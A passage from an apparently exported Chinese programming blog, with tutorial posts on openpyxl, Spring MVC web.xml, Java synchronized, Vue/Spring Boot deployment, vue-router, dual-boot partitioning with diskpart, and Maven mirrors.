class="string">&quot;Sheet&quot;</span>)  <span class="comment"># 推荐使用下面的获取方法</span></span><br><span class="line">sheet = wb[<span class="string">&quot;Sheet&quot;</span>]</span><br><span class="line"><span class="comment"># 获取表的下标位置（下标从0开始）</span></span><br><span class="line"><span class="comment"># index = wb.get_index(ws2)  # 推荐下面的获取方法</span></span><br><span class="line">index = wb.index(ws2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.2移动、复制、删除表</span></span><br><span class="line">wb.move_sheet(<span class="string">&quot;my_sheet111&quot;</span>, -<span class="number">1</span>)   <span class="comment"># 向前移动一个位置，正数往后，负数往前</span></span><br><span class="line"><span class="comment"># 删除工作表</span></span><br><span class="line"><span class="comment"># wb.remove_sheet(ws1)  # 方法1</span></span><br><span class="line"><span class="keyword">del</span> wb[<span class="string">&quot;my_sheet111&quot;</span>]  <span class="comment"># 方法2</span></span><br><span class="line"><span class="comment"># 复制工作表</span></span><br><span class="line">cp_sheet = wb.copy_worksheet(ws1)</span><br></pre></td></tr></table></figure>

<h2 id="操作单元格"><a href="#操作单元格" class="headerlink" title="操作单元格"></a>操作单元格</h2><ol>
<li><h3 id="获取和修改单个单元格"><a href="#获取和修改单个单元格" class="headerlink" title="获取和修改单个单元格"></a>获取和修改单个单元格</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.1获取单元格</span></span><br><span class="line">cell = ws[<span class="string">&quot;a6&quot;</span>]  <span class="comment"># 通过坐标获取</span></span><br><span class="line">cell2 = ws.cell(<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># 通过行列下标获取</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.2直接修改某个单元格的值</span></span><br><span class="line">ws[<span class="string">&quot;a5&quot;</span>] = <span class="number">666</span>  </span><br><span class="line">ws[<span class="string">&#x27;A3&#x27;</span>] = datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)  <span class="comment"># 修改为时间类型</span></span><br><span class="line">ws.append([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment"># 在最下面新增一行追加一个或多个值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.3先获取单元格对象然后再进行修改（这种引用方式修改，所以会直接修改本地表格中的数据）</span></span><br><span class="line">cell = ws[<span class="string">&quot;a6&quot;</span>]		<span class="comment"># 方式一</span></span><br><span class="line">cell.value = <span class="number">777</span>	</span><br><span class="line"><span class="built_in">print</span>(cell, cell.value)  <span class="comment"># 输出：&lt;Cell &#x27;Sheet&#x27;.A6&gt; 777</span></span><br><span class="line">cell2 = ws.cell(<span class="number">6</span>, <span class="number">1</span>)  <span class="comment"># 方式二：6行第1列，即A6</span></span><br><span class="line"><span class="built_in">print</span>(cell2, cell2.value)  <span class="comment"># 输出：&lt;Cell &#x27;Sheet&#x27;.A6&gt; 777</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.4单元格坐标信息</span></span><br><span class="line"><span class="built_in">print</span>(c.coordinate)  <span class="comment"># 单元格坐标，例如A6</span></span><br><span class="line"><span class="built_in">print</span>(c.column_letter)  <span class="comment"># 单元格列名，例如A</span></span><br><span class="line"><span class="built_in">print</span>(c.col_idx)  <span class="comment"># 单元列下标，例如1</span></span><br><span class="line"><span class="built_in">print</span>(c.row)  <span class="comment"># 单元格所在行，例如6</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h3 id="获取多个单元格"><a href="#获取多个单元格" class="headerlink" title="获取多个单元格"></a>获取多个单元格</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        ws.cell(row=x, column=y, value=i)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="comment"># 2.1获取单行、列</span></span><br><span class="line">row_cells = ws[<span class="number">2</span>]  <span class="comment"># 选取第2行（下标从1开始）</span></span><br><span class="line"><span class="built_in">print</span>(row_cells)  <span class="comment"># 输出：(A2, B2, C2, D2, E2, F2, G2, H2, I2, J2, K2, L2, M2, N2, O2, P2, Q2, R2, S2, T2)</span></span><br><span class="line">col_cells = ws[<span class="string">&quot;b&quot;</span>]  <span class="comment"># 选取B列</span></span><br><span class="line"><span class="built_in">print</span>(col_cells)  <span class="comment"># 输出：(B1, B2, B3, B4, B5, B6, B7, B8, B9, B10)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.2获取 多列 或 多行</span></span><br><span class="line">row_range_cells = ws[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 选取2、3、4、5共4行</span></span><br><span class="line"><span class="built_in">print</span>(row_range_cells)  <span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># ((A2, B2, C2, D2, E2, F2, G2, H2, I2, J2, K2, L2, M2, N2, O2, P2, Q2, R2, S2, T2),</span></span><br><span class="line"><span class="comment"># (A3, B3, C3, D3, E3, F3, G3, H3, I3, J3, K3, L3, M3, N3, O3, P3, Q3, R3, S3, T3),</span></span><br><span class="line"><span class="comment"># (A4, B4, C4, D4, E4, F4, G4, H4, I4, J4, K4, L4, M4, N4, O4, P4, Q4, R4, S4, T4),</span></span><br><span class="line"><span class="comment"># (A5, B5, C5, D5, E5, F5, G5, H5, I5, J5, K5, L5, M5, N5, O5, P5, Q5, R5, S5, T5))</span></span><br><span class="line">col_range_cells = ws[<span class="string">&quot;B:D&quot;</span>]  <span class="comment"># 选取B、C、D共3列</span></span><br><span class="line"><span class="built_in">print</span>(col_range_cells)  <span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># ((B1, B2, B3, B4, B5, B6, B7, B8, B9, B10),</span></span><br><span class="line"><span class="comment"># (C1, C2, C3, C4, C5, C6, C7, C8, C9, C10),</span></span><br><span class="line"><span class="comment"># (D1, D2, D3, D4, D5, D6, D7, D8, D9, D10))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.3获取多行列</span></span><br><span class="line">range_cells = ws[<span class="string">&quot;c3:f6&quot;</span>]  <span class="comment"># 选取 C3到F6区域共16个元素</span></span><br><span class="line"><span class="built_in">print</span>(range_cells)  <span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># ((C3, D3, E3, F3),</span></span><br><span class="line"><span class="comment"># (C4, D4, E4, F4),</span></span><br><span class="line"><span class="comment"># (C5, D5, E5, F5),</span></span><br><span class="line"><span class="comment"># (C6, D6, E6, F6))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.4通过iter_rows或iter_cols返回生成器，再遍历；</span></span><br><span class="line">cells = ws.iter_rows(min_row=<span class="number">1</span>, max_row=<span class="number">3</span>, min_col=<span class="number">2</span>, max_col=<span class="number">5</span>)	<span class="comment"># iter_cols和iter_rows都可以指定参数values_only=True，这样只返回值而不是cell对象</span></span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> cells:</span><br><span class="line">    <span class="built_in">print</span>(cell)</span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># (B1, C1, D1, E1)</span></span><br><span class="line"><span class="comment"># (B2, C2, D2, E2)</span></span><br><span class="line"><span class="comment"># (B3, C3, D3, E3)</span></span><br><span class="line">cells = ws.iter_cols(min_row=<span class="number">1</span>, max_row=<span class="number">3</span>, min_col=<span class="number">2</span>, max_col=<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> cells:</span><br><span class="line">    <span class="built_in">print</span>(cell)</span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># (B1, B2, B3)</span></span><br><span class="line"><span class="comment"># (C1, C2, C3)</span></span><br><span class="line"><span class="comment"># (D1, D2, D3)</span></span><br><span class="line"><span class="comment"># (E1, E2, E3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.5遍历全部 行 或 列（但是只读模式下 columns属性无效）</span></span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> ws.rows:</span><br><span class="line">    <span class="built_in">print</span>(cell)</span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> ws.columns:</span><br><span class="line">    <span class="built_in">print</span>(cell)</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> ws.values:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> row:</span><br><span class="line">        <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><h3 id="操作单元格-1"><a href="#操作单元格-1" class="headerlink" title="操作单元格"></a>操作单元格</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        ws.cell(row=x, column=y, value=i)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.1合并单元格</span></span><br><span class="line"><span class="built_in">print</span>(ws[<span class="string">&quot;C2&quot;</span>].value)  <span class="comment"># 输出：23</span></span><br><span class="line">ws.merge_cells(<span class="string">&quot;A1:F3&quot;</span>)</span><br><span class="line">ws.unmerge_cells(<span class="string">&quot;A1:F3&quot;</span>)</span><br><span class="line"><span class="comment"># 等同于下面的代码</span></span><br><span class="line"><span class="comment"># ws.merge_cells(start_row=1, start_column=1, end_row=3, end_column=6)</span></span><br><span class="line"><span class="comment"># ws.unmerge_cells(start_row=1, start_column=1, end_row=3, end_column=6)</span></span><br><span class="line"><span class="built_in">print</span>(ws[<span class="string">&quot;C2&quot;</span>].value)  <span class="comment"># 输出：None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.2插入列、插入行、删除列、删除行</span></span><br><span class="line">ws.insert_cols(<span class="number">5</span>)  <span class="comment"># 在第5列即E列插入1列，原来的E列及后面的列都往后移动</span></span><br><span class="line">ws.insert_rows(<span class="number">2</span>, <span class="number">3</span>)  <span class="comment"># 在第2行后面插入3行</span></span><br><span class="line">ws.delete_cols(<span class="number">2</span>, <span class="number">3</span>)  <span class="comment"># 从2列开始往后删除3列</span></span><br><span class="line">ws.delete_rows(<span class="number">5</span>, <span class="number">3</span>)  <span class="comment"># 从5行开始往后删除3行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.3移动单元格</span></span><br><span class="line">ws.move_range(<span class="string">&quot;B1:D3&quot;</span>, rows=<span class="number">6</span>, cols=-<span class="number">1</span>, translate=<span class="literal">False</span>)  <span class="comment"># 移动单元格，向下移动6行，向左移动1列</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>openpyxl使用-公式</title>
    <url>/2023/11/04/openpyxl%E4%BD%BF%E7%94%A8%EF%BC%882%EF%BC%89-%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl.utils <span class="keyword">import</span> FORMULAE		<span class="comment"># 导入包</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(FORMULAE)  <span class="comment"># frozenset(&#123;&#x27;ODD&#x27;, &#x27;VDB&#x27;, &#x27;RANK&#x27;, &#x27;LOGEST&#x27;, &#x27;ISNONTEXT&#x27;, &#x27;COUNTA&#x27;...</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(FORMULAE))  <span class="comment"># 352</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否支持某个公式，公式名区分大小写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SUM&quot;</span> <span class="keyword">in</span> FORMULAE)  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;PI&quot;</span> <span class="keyword">in</span> FORMULAE)  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sum&quot;</span> <span class="keyword">in</span> FORMULAE)  <span class="comment"># False</span></span><br></pre></td></tr></table></figure>

<h2 id="使用公式"><a href="#使用公式" class="headerlink" title="使用公式"></a>使用公式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">ws.append([<span class="string">&quot;价格1&quot;</span>, <span class="string">&quot;价格2&quot;</span>, <span class="string">&quot;总和&quot;</span>, <span class="string">&quot;平均值&quot;</span>])</span><br><span class="line">ws.append([<span class="number">22</span>, <span class="number">63</span>])</span><br><span class="line">ws.append([<span class="number">11</span>, <span class="number">88</span>])</span><br><span class="line">ws.append([<span class="number">15</span>, <span class="number">68</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用公式方法 同 excel中一样</span></span><br><span class="line">ws[<span class="string">&quot;c2&quot;</span>] = <span class="string">&quot;=SUM(A2,B2)&quot;</span>  <span class="comment"># 求和</span></span><br><span class="line">ws[<span class="string">&quot;d2&quot;</span>] = <span class="string">&quot;=AVERAGE(A2:B2)&quot;</span>  <span class="comment"># 求平均值</span></span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231104150430.png?token=AQXPXNWMSBYOHGHGWVGPUBTFIXWTU" alt="image-20231104150428060"></p>
<h2 id="翻译公式"><a href="#翻译公式" class="headerlink" title="翻译公式"></a>翻译公式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"><span class="keyword">from</span> openpyxl.formula.translate <span class="keyword">import</span> Translator</span><br><span class="line"></span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line"></span><br><span class="line">ws.append([<span class="string">&quot;价格1&quot;</span>, <span class="string">&quot;价格2&quot;</span>, <span class="string">&quot;总和&quot;</span>, <span class="string">&quot;平均值&quot;</span>])</span><br><span class="line">ws.append([<span class="number">22</span>, <span class="number">63</span>])</span><br><span class="line">ws.append([<span class="number">11</span>, <span class="number">88</span>])</span><br><span class="line">ws.append([<span class="number">15</span>, <span class="number">68</span>])</span><br><span class="line"></span><br><span class="line">ws[<span class="string">&quot;c2&quot;</span>] = <span class="string">&quot;=SUM(A2,B2)&quot;</span></span><br><span class="line">ws[<span class="string">&quot;d2&quot;</span>] = <span class="string">&quot;=AVERAGE(A2:B2)&quot;</span></span><br><span class="line"><span class="comment"># C3、C4使用上面的C2的求和公式</span></span><br><span class="line"><span class="comment"># 方式一：直接定位</span></span><br><span class="line">ws[<span class="string">&quot;C3&quot;</span>] = Translator(formula=<span class="string">&quot;=SUM(A2,B2)&quot;</span>, origin=<span class="string">&quot;C2&quot;</span>).translate_formula(<span class="string">&quot;C3&quot;</span>)</span><br><span class="line">ws[<span class="string">&quot;C4&quot;</span>] = Translator(formula=<span class="string">&quot;=SUM(A2,B2)&quot;</span>, origin=<span class="string">&quot;C2&quot;</span>).translate_formula(<span class="string">&quot;C4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式二：使用循环（当需要大量翻译公式的时候，如果需要修改，只需要修改被翻译的单元的公式即可）</span></span><br><span class="line"><span class="comment"># C3、C4使用上面的C2的求和公式</span></span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> ws[<span class="string">&quot;C3:C4&quot;</span>]:</span><br><span class="line">    <span class="comment"># ws[&quot;C3&quot;] = Translator(formula=&quot;=SUM(A2,B2)&quot;, origin=&quot;C2&quot;).translate_formula(&quot;C3&quot;)</span></span><br><span class="line">    cell[<span class="number">0</span>].value = Translator(formula=<span class="string">&quot;=SUM(A2,B2)&quot;</span>, origin=<span class="string">&quot;C2&quot;</span>).translate_formula(cell[<span class="number">0</span>].coordinate)</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20231104151142.png?token=AQXPXNTIHEQSDZ5LSHMPL6TFIXXOU" alt="image-20231104151141230"></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>springMVC的web.xml配置</title>
    <url>/2021/11/10/springMVC%E7%9A%84web-xml%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="springMVC的web-xml配置"><a href="#springMVC的web-xml配置" class="headerlink" title="springMVC的web.xml配置"></a>springMVC的web.xml配置</h2><span id="more"></span>


<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--注册servlet--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SpringMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--初始化Spring配置文件的位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--启动顺序，数字越小，启动越早--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--所有的请求都会被SpringMVC拦截--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SpringMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--这是使用注解开发时固定的配置--&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>SSM</tag>
        <tag>SpringMVC</tag>
        <tag>web.xml配置</tag>
      </tags>
  </entry>
  <entry>
    <title>synchronized用法</title>
    <url>/2024/11/05/synchronized%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h2 id="synchronized用法"><a href="#synchronized用法" class="headerlink" title="synchronized用法"></a>synchronized用法</h2><span id="more"></span>

<p>首先，<code>synchronized</code>不可以修饰变量</p>
<p><code>synchronized</code>三种使用方式：</p>
<ul>
<li>修饰实例方法：作用于当前实例加锁</li>
<li>修饰静态方法：作用于当前类对象加锁</li>
<li>修饰代码块：指定加锁对象，对指定的对象加锁（class也是一种对象）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20241105155949.png" alt="image-20241105155947763"></p>
<p><strong>注意：</strong>所说的给实例对象或者类对象上锁，的意思都是：在执行到有<code>synchronized</code>修饰的代码的时候，给相应的对象进行上锁</p>
]]></content>
      <tags>
        <tag>多线程</tag>
        <tag>锁</tag>
      </tags>
  </entry>
  <entry>
    <title>vue项目和springboot项目部署到服务器</title>
    <url>/2023/07/07/vue%E9%A1%B9%E7%9B%AE%E5%92%8Cspringboot%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><span id="more"></span>

<p>首先简要说明一下，真个过程中大概涉及到一下知识点：<strong>数据库</strong>、<strong>项目打包</strong>、<strong>请求代理</strong>、<strong>防火墙</strong></p>
<ol>
<li><p>数据库：<br>服务器创建数据库mysql<br>redis服务开启状态<br>后端修改mysql的ip、账号、密码<br>后端修改redis的ip、账号、密码</p>
</li>
<li><p>前端请求后端接口（注意请求代理是否只是再开发环境下生效的）<br>前端确认请求的后端的ip地址（可以还是localhost，二者都在服务器中）<br>请求代理的配置（如果之前的请求代理仅在开发环境生效，则要么前端打包前在创建一个.<strong>env</strong>文件写明一下，要么在下面的<strong>nginx中配置</strong>一下）</p>
</li>
<li><p>前后端打包：<br>后端使用maven打包成jar，放到服务器（建议使用maven的打包方式，可以避免直接build会出现的找不到mainfest问题）<br>前端项目打包，放到服务器</p>
</li>
<li><p>配置nginx<br>服务器的nginx.conf中添加server（如果前端的请求代理之前没有配置，即之前仅为开发环境下的，那么部署到服务器中不会生效，可以在nginx中的server中通过location形式添加一个请求代理）（否则会报404错误）</p>
</li>
<li><p>配置防火墙<br>server中的端口再防火墙中确认打开放行，未放行则添加放行端口，并重启防火墙</p>
</li>
<li><p>最后<br>指定nginx.conf文件重新启动nginx</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>部署项目</tag>
      </tags>
  </entry>
  <entry>
    <title>vue-router知识架构</title>
    <url>/2023/07/04/vue-router%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<h2 id="Vue-Router知识点回顾"><a href="#Vue-Router知识点回顾" class="headerlink" title="Vue-Router知识点回顾"></a>Vue-Router知识点回顾</h2><span id="more"></span>

<ol>
<li>声明式（<code>router-link</code>）&amp;编程式（<code>$this.router.push()</code>）</li>
<li>动态路由（路由路径携带参数，<code>$route.params</code>）</li>
<li>命名路由（命名视图）</li>
<li>嵌套路由（<code>children属性</code>）</li>
<li>路由重定向（<code>redirect属性</code>）</li>
<li>路由组件传参props（布尔、对象、函数模式，<code>props</code>，<code>$route.params</code>）</li>
<li>路由守卫（组件的、单个路由的、全局的；前置守卫、后置守卫）</li>
<li>路由元信息（<code>meta</code>，<code>$route.matched</code>数组）</li>
</ol>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>vue-router</tag>
      </tags>
  </entry>
  <entry>
    <title>windows和Ubuntu双系统安装(终于解决!)</title>
    <url>/2022/03/02/windows%E5%92%8CUbuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85(%E7%BB%88%E4%BA%8E%E8%A7%A3%E5%86%B3!)/</url>
    <content><![CDATA[<h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><span id="more"></span>

<p><img src="https://s2.loli.net/2022/03/02/bf3KZxyvNc6OApY.png" alt="image-20220302013310107"></p>
<p><strong>建议①：在制作镜像U盘的时候，建议使用Rufus，且分区类型设置为GPT类型</strong></p>
<blockquote>
<p>注意：旧版本的UitraIso可能只能用在BIOS启动、MBR分区</p>
<p>Rufus制作出来的镜像可以用在uefi启动、gpt分区</p>
</blockquote>
<h2 id="最后一步：Ubuntu分区"><a href="#最后一步：Ubuntu分区" class="headerlink" title="最后一步：Ubuntu分区"></a>最后一步：Ubuntu分区</h2><p>最难的步骤就是这个环节了，照着网上分了以下的几个区（<strong>这个分区不一定对，是有问题的</strong>）：</p>
<table>
<thead>
<tr>
<th>目录</th>
<th>建议大小</th>
<th>格式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>efi分区</strong>（很重要！！<strong>建议在windows的diskpart中分配</strong>）</td>
<td>200M足够</td>
<td></td>
<td>主分区，空间起始位置，efi系统分区</td>
</tr>
<tr>
<td>/分区（<strong>必须有</strong>）</td>
<td>我分了100G</td>
<td></td>
<td>主分区，空间起始位置，Ext4日志文件系统，挂载点/</td>
</tr>
<tr>
<td>/boot分区</td>
<td>3G足够</td>
<td></td>
<td>主分区，空间起始位置，Ext4日志文件系统，挂载点/boot</td>
</tr>
<tr>
<td>swap分区</td>
<td>网上都是建议与内存大小空间相同</td>
<td></td>
<td>逻辑分区，空间起始位置，用于交换空间</td>
</tr>
<tr>
<td>/home分区</td>
<td>我分了300G</td>
<td></td>
<td>逻辑分区，空间起始位置，Ext4日志文件系统，挂载点/home</td>
</tr>
</tbody></table>
<p><strong>照上面的分区，我进不了Ubuntu</strong>（即使使用了Easybcd,也是进不了，报错找不到efi引导）</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>每个步骤网上都可以找到教程，但是Ubuntu分区这一块，网上的教程在我这行不通</p>
<p>efi分区 和 /分区 一定要有（但是efi分区不在这里分配，建议在windows10中cmd里的进行分配）</p>
<p>命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">diskpart	//先进入Diskpart工具</span><br><span class="line">sel disk <span class="number">0</span>	//选择磁盘，编号顺序同磁盘管理打开从上到下顺序一致</span><br><span class="line">cre par efi size=<span class="number">300</span> 	//创建饿了efi分区，前提需要有这么大的空闲空间</span><br><span class="line"><span class="keyword">for</span> quick <span class="built_in">fs</span>=fat32 <span class="built_in">label</span>=&quot;efi&quot;	//我也不知道什么意思，照做即可	</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/03/02/flIF9KpHGQmZBen.png" alt="image-20220302005232341"></p>
<p><strong>注意①：在上面命令中创建efi分区，有一个前提：磁盘分区形式需要是GPT</strong>（具体磁盘转换方法可以网上search）</p>
<blockquote>
<p>如果磁盘不是gpt的，而是mbr的，可以在选择了磁盘之后，使用<code>convert gpt</code>格式化一下磁盘分区形式（使用前需要clean一下，注意clean时保护好自己原来的文件，最好弄个备份）</p>
</blockquote>
<p><strong>注意②：</strong>这边结束了，在Ubuntu分区的时候，就<strong>不要再分efi分区</strong>。而且，<strong>选择启动引导位置的时候，直接选择这个分号的efi分区</strong>。</p>
]]></content>
      <tags>
        <tag>玩机</tag>
      </tags>
  </entry>
  <entry>
    <title>为idea配置全局maven加速镜像、单个项目maven（阿里）加速镜像</title>
    <url>/2021/08/17/%E4%B8%BAidea%E9%85%8D%E7%BD%AE%E5%85%A8%E5%B1%80maven%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F%E3%80%81%E5%B1%80%E9%83%A8%E9%A1%B9%E7%9B%AEmaven%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="一、配置全局加速镜像"><a href="#一、配置全局加速镜像" class="headerlink" title="一、配置全局加速镜像"></a>一、配置全局加速镜像</h2><span id="more"></span>

<p>在maven的文件夹中找到settings.xml：<strong>apache-maven-3.6.3 -&gt; conf -&gt; settings.xml</strong></p>
<p><img src="https://i.loli.net/2021/08/17/z8EiKbdTlxBHCeY.png" alt="image-20210817114640782"></p>
<p><img src="https://i.loli.net/2021/08/17/qK3WStpsNzk6EFo.png" alt="image-20210817114550506"></p>
<p><img src="https://i.loli.net/2021/08/17/RTo4hs36JSPzZKG.png" alt="image-20210817115003041"></p>
<p>在settings.xml文件中的<mirrors></mirrors>中添加<mirror></mirror></p>
<p>保存设置即可。</p>
<h2 id="二、单个项目配置阿里加速镜像"><a href="#二、单个项目配置阿里加速镜像" class="headerlink" title="二、单个项目配置阿里加速镜像"></a>二、单个项目配置阿里加速镜像</h2><p>打开项目，进入pom.xml文件</p>
<p><img src="https://i.loli.net/2021/08/17/BaY17EpeZ5SFh3c.png" alt="image-20210817115447445"></p>
<p>添加代码如下：</p>
